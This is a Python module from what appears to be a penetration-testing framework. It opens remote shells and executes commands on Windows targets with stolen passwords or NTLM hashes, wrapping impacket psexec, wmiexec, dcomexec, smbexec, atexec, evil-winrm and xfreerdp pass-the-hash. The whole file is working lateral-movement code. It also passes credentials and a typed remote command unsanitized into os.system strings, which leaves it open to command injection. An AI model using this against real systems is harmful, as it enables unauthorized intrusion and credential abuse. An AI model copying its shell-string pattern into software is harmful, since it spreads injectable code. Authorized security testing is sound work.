# commands/connect.py
import os
import shutil
import argparse
from core.colors import red, green, yellow, blue
from core.helpers import run_command, select_from_list
import pexpect


def handle_connect(args, session_mgr):
    if not args:
        print_usage()
        return

    cmd = args[0].lower()

    session = session_mgr.get_current()
    if not session:
        print(red("[-] No active session. Use 'session use <name>' first."))
        return

    run_connect(cmd, session)


def run_connect(cmd, session):
    if cmd == "smb":
        connect_smb(session)
    elif cmd == "winrm":
        connect_winrm(session)
    elif cmd == "rdp":
        connect_rdp(session)
    elif cmd == "psexec":
        connect_psexec(session)
    elif cmd == "ftp":
        connect_ftp(session)
    elif cmd == "mssql":
        connect_mssql(session)
    elif cmd == "wmi":
        connect_wmi(session)
    elif cmd == "dcom":
        connect_dcom(session)
    elif cmd == "smbexec":
        connect_smbexec(session)
    elif cmd == "atexec":
        connect_atexec(session)
    else:
        print(red(f"[-] Unknown connect method: {cmd}"))
        print_usage()


def connect_smb(session):
    if not shutil.which("smbclient") and not shutil.which("impacket-smbclient"):
        print(red("[-] Neither smbclient nor impacket-smbclient found in PATH."))
        return

    ip = session.target_ip
    user = session.username
    domain = session.domain

    # Build listing command — support hash via impacket-smbclient
    if session.hash:
        if not shutil.which("impacket-smbclient"):
            print(red("[-] impacket-smbclient not found. Cannot use hash-based SMB."))
            return
        list_cmd = (
            f"impacket-smbclient {domain}/{user}@{ip} "
            f"-hashes :{session.hash} -no-pass -list /"
        )
    elif session.password:
        list_cmd = f"smbclient -L \\\\{ip} -U {user}%{session.password}"
    else:
        print(red("[-] No credentials in session for SMB."))
        return

    print(blue(f"[*] Listing available shares on {ip}..."))
    out, err = run_command(list_cmd)
    combined = out + "\n" + err

    if "NT_STATUS_LOGON_FAILURE" in combined:
        print(red("[-] Authentication failed. Check username or password."))
        return
    elif "Anonymous login successful" in combined:
        print(yellow("[!] Warning: logged in anonymously."))

    # Extract shares
    shares = []
    for line in combined.splitlines():
        if "Disk" in line and "\\" not in line:
            parts = line.split()
            if parts:
                shares.append(parts[0].strip())

    if not shares:
        print(red("[-] No shares found or listing failed."))
        print(yellow(combined.strip()))
        return

    shares.append("exit")
    share = select_from_list(shares, "[*] Select share to open (or type 'exit'):")

    if share.lower() == "exit":
        print(yellow("[*] Exiting SMB connect menu."))
        return

    if session.hash:
        connect_cmd = (
            f"impacket-smbclient {domain}/{user}@{ip} "
            f"-hashes :{session.hash} -no-pass"
        )
    else:
        connect_cmd = f"smbclient \\\\\\\\{ip}\\\\{share} -U {user}%{session.password}"

    print(blue(f"[*] Connecting to share: {share}"))
    print(yellow("[*] Type 'exit' to leave SMB shell.\n"))
    os.system(connect_cmd)


def connect_winrm(session):
    cmd = f"evil-winrm -i {session.target_ip} -u {session.username}"
    if session.hash:
        cmd += f" -H {session.hash}"
    elif session.password:
        cmd += f" -p '{session.password}'"
    else:
        print(red("[-] Missing credentials for WinRM connection."))
        return
    os.system(cmd)


def connect_rdp(session):
    if session.password:
        cmd = f"xfreerdp3 /u:{session.username} /p:{session.password} /v:{session.target_ip} +dynamic-resolution /clipboard:direction-to:all,files-to:all"
    elif session.hash:
        cmd = f"xfreerdp3 /v:{session.target_ip} /u:{session.username} /pth:{session.hash} +dynamic-resolution /clipboard:direction-to:all,files-to:all"
    else:
        print(red("[-] RDP requires a password or hash (PtH)."))
        return

    print(blue(f"[*] Launching: {cmd}"))
    os.system(cmd)


def connect_psexec(session):
    if not shutil.which("impacket-psexec"):
        print(red("[-] impacket-psexec not found in PATH."))
        return

    if session.hash:
        cmd = f"impacket-psexec {session.domain}/{session.username}@{session.target_ip} -hashes :{session.hash}"
    elif session.password:
        cmd = f"impacket-psexec {session.domain}/{session.username}:{session.password}@{session.target_ip}"
    else:
        print(red("[-] No credentials for psexec."))
        return

    print(blue(f"[*] Launching: {cmd}"))
    os.system(cmd)


def connect_ftp(session):
    print(blue(f"[*] Trying FTP on {session.target_ip}..."))

    anon_cmd = f"echo open {session.target_ip} 21\\nuser anonymous\\nquit | ftp -n"
    out, err = run_command(anon_cmd)
    if "230" in (out + err):
        print(green("[+] FTP allows anonymous login."))
        return

    if session.password:
        cmd = f"echo open {session.target_ip} 21\\nuser {session.username} {session.password}\\nquit | ftp -n"
        out, err = run_command(cmd)
        if "230" in (out + err):
            print(green("[+] FTP login successful with user credentials."))
        else:
            print(red("[-] FTP access denied with provided credentials."))
    else:
        print(yellow("[*] No password to try FTP authentication."))


def connect_mssql(session):
    if not shutil.which("impacket-mssqlclient"):
        print(red("[-] impacket-mssqlclient not found in PATH."))
        return

    if not session.username:
        print(red("[-] Missing username for MSSQL connection."))
        return

    if session.hash:
        print(red("[-] MSSQL client does not support NTLM hashes directly. Use password."))
        return

    if not session.password:
        print(red("[-] Missing password for MSSQL connection."))
        return

    full_user = f"{session.domain}/{session.username}" if session.domain else session.username
    base_cmd = f"impacket-mssqlclient {full_user}:{session.password}@{session.dc_ip} -windows-auth"

    def fallback_sql():
        fallback_cmd = f"impacket-mssqlclient {session.username}:{session.password}@{session.dc_ip}"
        print(blue(f"[*] Launching: {fallback_cmd}"))
        fallback_child = pexpect.spawn(fallback_cmd, timeout=None, encoding='utf-8')
        fallback_child.interact()

    print(blue(f"[*] Launching: {base_cmd}"))
    try:
        child = pexpect.spawn(base_cmd, timeout=15, encoding='utf-8')
        index = child.expect([
            "Login failed for user",
            "user '.*?Guest'",
            r"SQL .*?master\)>",
            pexpect.EOF,
            pexpect.TIMEOUT,
        ])

        if index in [0, 1]:
            print(yellow("[!] Login failed or downgraded to Guest. Falling back to SQL Auth..."))
            child.close()
            fallback_sql()
        elif index == 2:
            child.interact()
        else:
            print(red("[-] Unexpected response or timeout."))

    except Exception as e:
        print(red(f"[-] Error launching MSSQL client: {e}"))


def connect_wmi(session):
    if not shutil.which("impacket-wmiexec"):
        print(red("[-] impacket-wmiexec not found in PATH."))
        return

    if session.hash:
        cmd = f"impacket-wmiexec {session.domain}/{session.username}@{session.target_ip} -hashes :{session.hash}"
    elif session.password:
        cmd = f"impacket-wmiexec {session.domain}/{session.username}:{session.password}@{session.target_ip}"
    else:
        print(red("[-] No credentials for WMI exec."))
        return

    print(blue(f"[*] Launching WMI exec: {cmd}"))
    os.system(cmd)


def connect_dcom(session):
    if not shutil.which("impacket-dcomexec"):
        print(red("[-] impacket-dcomexec not found in PATH."))
        return

    if session.hash:
        cmd = f"impacket-dcomexec {session.domain}/{session.username}@{session.target_ip} -hashes :{session.hash} -object MMC20"
    elif session.password:
        cmd = f"impacket-dcomexec {session.domain}/{session.username}:{session.password}@{session.target_ip} -object MMC20"
    else:
        print(red("[-] No credentials for DCOM exec."))
        return

    print(blue(f"[*] Launching DCOM exec: {cmd}"))
    os.system(cmd)


def connect_smbexec(session):
    if not shutil.which("impacket-smbexec"):
        print(red("[-] impacket-smbexec not found in PATH."))
        return

    if session.hash:
        cmd = f"impacket-smbexec {session.domain}/{session.username}@{session.target_ip} -hashes :{session.hash}"
    elif session.password:
        cmd = f"impacket-smbexec {session.domain}/{session.username}:{session.password}@{session.target_ip}"
    else:
        print(red("[-] No credentials for smbexec."))
        return

    print(blue(f"[*] Launching: {cmd}"))
    os.system(cmd)


def connect_atexec(session):
    if not shutil.which("impacket-atexec"):
        print(red("[-] impacket-atexec not found in PATH."))
        return

    command = input("[?] Command to execute remotely: ").strip()
    if not command:
        print(red("[-] No command specified."))
        return

    if session.hash:
        cmd = f"impacket-atexec {session.domain}/{session.username}@{session.target_ip} -hashes :{session.hash} '{command}'"
    elif session.password:
        cmd = f"impacket-atexec {session.domain}/{session.username}:{session.password}@{session.target_ip} '{command}'"
    else:
        print(red("[-] No credentials for atexec."))
        return

    print(blue(f"[*] Launching: {cmd}"))
    os.system(cmd)


def print_usage():
    print(blue("Usage:"))
    print("  connect smb       - Open SMB shell (supports hash via impacket-smbclient)")
    print("  connect winrm     - Launch Evil-WinRM shell (supports hash)")
    print("  connect rdp       - Launch RDP client (xfreerdp, supports PtH)")
    print("  connect psexec    - Run remote shell via impacket-psexec")
    print("  connect ftp       - Try FTP login (anonymous or user)")
    print("  connect mssql     - Connect to MSSQL via impacket-mssqlclient")
    print("  connect wmi       - WMI exec via impacket-wmiexec")
    print("  connect dcom      - DCOM/MMC exec via impacket-dcomexec")
    print("  connect smbexec   - SMB exec via impacket-smbexec")
    print("  connect atexec    - AT exec via impacket-atexec")
